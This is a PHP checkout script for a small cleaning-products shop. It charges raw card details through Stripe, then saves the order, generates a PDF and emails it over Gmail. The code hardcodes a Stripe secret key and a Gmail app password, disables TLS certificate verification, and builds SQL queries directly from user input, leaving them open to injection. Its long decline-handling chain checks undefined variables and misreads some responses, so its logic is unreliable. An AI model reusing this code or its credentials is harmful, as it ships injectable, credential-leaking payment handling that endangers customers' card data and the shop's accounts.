<?php
// print_r($_POST);
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require '../phpmailer/src/Exception.php';
require '../phpmailer/src/PHPMailer.php';
require '../phpmailer/src/SMTP.php';
$mail = new PHPMailer(true);

include '../conn.php';
include '../fpdf185/fpdf.php';
$pdf=new FPDF();
$pdf->AddPage();
$pdf->SetFont('Arial','',16);

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
// print_r($_POST);
// $idd = $_GET['idd'];
$give = false;
$sk = "sk_test_51MtaNvSCAovY2OS310eExcrTcxZisWFE1dkzuAr00uqeVqlPQVTcMLfxg7Noogxsb0XTOZ1Vli7V6pHFtJcqTG8k00Bn8oqh0H";

$cur = 'inr';
$amt = $_POST["total"];
$email = $_POST["email"];
$username = $_POST["username"];
$zip = 380004;
$phone = $_POST["phone"];
$add_line1 = $_POST["address"];
$name = $_POST["name"];
$cc = $_POST["number"];
$mes = explode("/",$_POST["exp"])[0];
$ano = explode("/",$_POST["exp"])[1];
$cvv = $_POST["cvc"];

$api_amt = $amt*100;
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]='.$add_line1.'&billing_details[email]='.$email.'&billing_details[name]='.$name.'');
$result1 = curl_exec($ch);
$tok1 = Getstr($result1,'"id": "','"');
$msg = Getstr($result1,'"message": "','"');
// echo "<br><b>Result1: </b> $result1<br>";

#-------------------[2nd REQ]--------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$api_amt.'&currency='.$cur.'&payment_method_types[]=card&payment_method='.$tok1.'&confirm=true&off_session=true');
$result2 = curl_exec($ch);
$tok2 = Getstr($result2,'"id": "','"');
$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
// echo "<br><b>Result2: </b> $result2<br>";



//=================== [ RESPONSES ] ===================//
function success_payment(){
    global $conn;
    global $username;
    global $amt;
    global $email;
    global $phone;
    global $add_line1;
    global $amt;
    global $pdf;
    global $name;
    global $mail;
    // echo "heelo";
    $sql = "select id from cart where username='$username'";
    $res = $conn->query($sql);
    $delIds = "";
    while($rowwww = $res->fetch_assoc()){
        $delIds = $delIds . $rowwww["id"] . ",";
    }
    $delIds = rtrim($delIds,",");

    
    $pdfString = "Clean house\n\nOrder list\n\nCustomer name: $name\n\nMobile No: $phone\n\nEmail: $email\n\nAddress: $add_line1\n\n";
    $pdf->Multicell(80,10,$pdfString);
    $sql = "select * from cart where username='$username'";
    $result = $conn->query($sql);
    $pdf->Multicell(80,10,"----- Order -----");
    while($row = $result->fetch_assoc()){
        $pdf->Multicell(80,10,$row["Item_name"] . "    " . $row["item_price"]);
    }
    $pdf->Multicell(80,10,"Total:  $amt");
    $random_number = rand() . ".pdf";
    $pdf->Output('F','../uploads/order_pdf/'.$random_number);

    $sql = "INSERT INTO `order` (username, email, phone, address, total, status, pdf) VALUES ('$username', '$email', '$phone', '$add_line1', '$amt', 'done' , '$random_number')";
    $conn->query($sql);


    $subject = "New order!";
    $body = "Order info in this pdf file!";

    // sending it in mail
    


    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'cleanhouse213@gmail.com'; // gmail
    $mail->Password = 'navqpecxwjpmzduh'; // gmail app password
    $mail->SMTPSecure = 'ssl';
    $mail->Port = 465;

    $mail->setFrom('cleanhouse213@gmail.com'); //gmail

    $mail->addAddress('cleanhouse213@gmail.com');

    $mail->addAddress('pretpatel.pp@gmail.com');

    $mail->addAddress($email);

    $mail->isHTML(true);
    $mail->addAttachment('../uploads/order_pdf/'.$random_number);
    $mail->Subject = $subject;
    $mail->Body = $body;

    $mail->send();

    $sql = "DELETE FROM cart WHERE id IN ($delIds);";
    $conn->query($sql);
}
if(strpos($result2, '"seller_message": "Payment complete."' )) {
    echo "payment success!";
    success_payment();
}
else if(strpos($result2, '"status": "succeeded"' )) {
    echo "payment success!";
    success_payment();
}
elseif(strpos($result2,'"cvc_check": "pass"')){
    echo "card declined";
}
elseif(strpos($result1, "generic_decline")) {
    echo "card declined";
    }
elseif(strpos($result2, "generic_decline" )) {
    echo "card declined";
}
elseif(strpos($result2, "insufficient_funds" )) {
    echo "card declined";
}

elseif(strpos($result2, "fraudulent" )) {
    echo "card declined";
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo "card declined";
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo "card declined";
}
elseif(strpos($result,"fraudulent")){
    echo "card declined";
}
elseif(strpos($result1,'"code":"rate_limit"')){
    echo "Payment error!";
}
elseif(strpos($result2,'"code":"rate_limit"')){
    echo "Payment error!";
}
elseif(strpos($result1,'"message": "Invalid API Key provided')){
    echo "Payment error!";
}
elseif(strpos($result2,'"message": "Invalid API Key provided')){
    echo "Payment error!";
}


elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo "card declined";
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo "card declined";
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo "card declined";
}
elseif(strpos($result2,"invalid_account")){
    echo "card declined";
}

elseif(strpos($result2, "do_not_honor")) {
    echo "card declined";
}
elseif(strpos($result2, "lost_card" )) {
    echo "card declined";
}
elseif(strpos($result2, "lost_card" )) {
    echo "card declined";
}

elseif(strpos($result2, "stolen_card" )) {
    echo "card declined";
}

elseif(strpos($result2, "stolen_card" )) {
    echo "card declined";
}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo "transaction not allowed";
}
elseif(strpos($result2, "authentication_required")) {
    echo "card declined";
} 
elseif(strpos($result2, "card_error_authentication_required")) {
    echo "card declined";
} 
elseif(strpos($result2, "card_error_authentication_required")) {
    echo "card declined";
} 
elseif(strpos($result1, "card_error_authentication_required")) {
    echo "card declined";
} 
elseif(strpos($result2, "incorrect_cvc" )) {
    echo "card declined";
}
elseif(strpos($result2, "pickup_card" )) {
    echo "card declined";
}
elseif(strpos($result2, "pickup_card" )) {
    echo "card declined";
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo "card declined";
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo "card declined";
}
elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
	echo 'Payment error!';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo "card declined";
}
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo "card declined";
}
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo "card declined";
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo "card declined";
}
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo "card declined";
}
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo "card declined";
}
elseif(strpos($result, "incorrect_number")) {
    echo "card declined";
}
elseif(strpos($result1, "incorrect_number")) {
    echo "card declined";
}
elseif(strpos($result1, "do_not_honor")) {
    echo "card declined";
}
elseif(strpos($result1, 'Your card was declined.')) {
    echo "card declined";
}
elseif(strpos($result1, "do_not_honor")) {
    echo "card declined";
}
elseif(strpos($result2, "generic_decline")) {
    echo "card declined";
}
elseif(strpos($result, 'Your card was declined.')) {
    echo "card declined";
}
elseif(strpos($result2,' "decline_code": "do_not_honor"')){
    echo "card declined";
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo "card declined";
}
elseif(strpos($result2, "card_not_supported")) {
    echo "card declined";
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo "card declined";
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo "card declined";
}
elseif(strpos($result2,"currency_not_supported")) {
    echo "card declined";
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo "card declined";
}

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo "card declined";
}
elseif(strpos($result2, "fraudulent" )) {
    echo "card declined";
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo "Payment error!";
}
elseif(strpos($result1, "api_key_expired" )) {
    echo "Payment error!";
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo "Payment error!";
}
elseif(strpos($result1, "card_not_supported" )) {
    echo "Card not supported";
}
else {
    echo "card declined";
}

curl_close($ch);
ob_flush();
?>